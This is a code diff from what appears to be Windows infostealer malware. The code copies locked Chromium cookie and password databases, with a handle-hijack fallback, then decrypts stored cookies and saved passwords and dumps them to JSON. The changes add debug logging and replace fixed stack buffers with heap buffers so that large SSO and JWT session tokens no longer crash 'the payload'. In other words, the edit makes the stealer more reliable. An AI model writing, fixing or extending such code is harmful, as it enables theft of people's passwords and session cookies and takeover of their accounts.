@@ -538,6 +538,7 @@ static bool CopyFileShared(const wchar_t* src, const wchar_t* dst){
         }
     }
     CloseHandle(hIn); CloseHandle(hOut);
+    DbgH("CopyFileShared: copy loop done");
     return true;
 }
 
@@ -549,6 +550,7 @@ static bool CopyDb(const wchar_t* src, wchar_t* dst, int dst_cap,
     wchar_t tmp[MAX_PATH]; GetTempPathW(MAX_PATH, tmp);
     lstrcpyW(dst, tmp); lstrcatW(dst, L"ck_db.tmp");
     DeleteFileW(dst);
+    DbgH("CopyDb: calling CopyFileShared");
     if(!CopyFileShared(src, dst)){
         // Browser holds 0-sharing lock â€” try handle hijack
         DbgH("CopyDb: CopyFileShared failed, trying handle hijack");
@@ -558,11 +560,13 @@ static bool CopyDb(const wchar_t* src, wchar_t* dst, int dst_cap,
         }
         return false;
     }
+    DbgH("CopyDb: main copy OK, doing wal/shm");
     wchar_t s2[MAX_PATH], d2[MAX_PATH];
     lstrcpyW(s2, src); lstrcatW(s2, L"-wal"); lstrcpyW(d2, dst); lstrcatW(d2, L"-wal");
     DeleteFileW(d2); CopyFileShared(s2, d2);
     lstrcpyW(s2, src); lstrcatW(s2, L"-shm"); lstrcpyW(d2, dst); lstrcatW(d2, L"-shm");
     DeleteFileW(d2); CopyFileShared(s2, d2);
+    DbgH("CopyDb: done");
     return true;
 }
 
@@ -793,9 +797,15 @@ static void DumpChromium(const wchar_t* brname, const wchar_t* root, const wchar
                 FieldS0("domain",st,0); FieldS("name",st,1); FieldS("path",st,2);
                 const unsigned char* enc=(const unsigned char*)S_blob(st,3); int en=S_bytes(st,3);
                 const char* host_key=(const char*)S_blob(st,0);  // host_key for SHA256 domain hash verification
-                unsigned char pt[4096]; int pn=0;
-                if(enc&&DecCookie(enc,en,pt,&pn,host_key)){ PutS(",\"value\":"); PutJ((char*)pt,pn); }
+                // Cookie blobs can exceed any fixed buffer (SSO/JWT session tokens reach
+                // 4-8KB+): a fixed pt[4096] overflowed the stack on the first oversized
+                // cookie and killed the payload silently. Heap buffer sized by the blob.
+                unsigned char* pt = (en > 0 && en <= 4194304)
+                    ? (unsigned char*)VirtualAlloc(NULL, en, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : NULL;
+                int pn=0;
+                if(pt && enc && DecCookie(enc,en,pt,&pn,host_key)){ PutS(",\"value\":"); PutJ((char*)pt,pn); }
                 else { PutS(",\"value\":\"\""); }
+                if(pt) VirtualFree(pt, 0, MEM_RELEASE);
                 // expires_utc: 64-bit microseconds since 1601 -> Unix epoch
                 long long eu = S_int64(st,4);
                 long long unix = eu ? eu / 1000000 - 11644473600LL : 0;
@@ -975,9 +985,13 @@ static void DumpPasswords(const wchar_t* name, const wchar_t* root, const wchar_
             // Note: passwords do NOT have the SHA256 domain hash prefix (only cookies do).
             // DecCookie will check SHA256(url) and not strip since it won't match.
             // Chromium stores passwords as UTF-16LE; convert to UTF-8 for JSON.
-            char pwd[4096]; int pwd_len=0;
+            // Same oversized-blob hazard as cookies in DumpChromium: password blobs are
+            // heap-allocated by size instead of a fixed 4KB stack buffer.
+            char* pwd = (enc_len > 0 && enc_len <= 4194304)
+                ? (char*)VirtualAlloc(NULL, enc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : NULL;
+            int pwd_len=0;
             bool pwd_ok = false;
-            if(enc_len > 3 && enc[0]=='v'){
+            if(pwd && enc_len > 3 && enc[0]=='v'){
                 pwd_ok = DecCookie((const unsigned char*)enc, enc_len, (unsigned char*)pwd, &pwd_len, url);
             }
             if(pwd_ok){
@@ -1016,6 +1030,7 @@ static void DumpPasswords(const wchar_t* name, const wchar_t* root, const wchar_
             PutS(",\"secure\":true,\"httpOnly\":true,\"hostOnly\":false,\"session\":true");
             PutS(",\"_username\":"); PutJ(user, user_len);
             PutS("}");
+            if(pwd) VirtualFree(pwd, 0, MEM_RELEASE);
         }
         DbgInt("DumpPasswords: rows extracted", rows);
         DbgInt("DumpPasswords: decrypted OK", dec_ok);
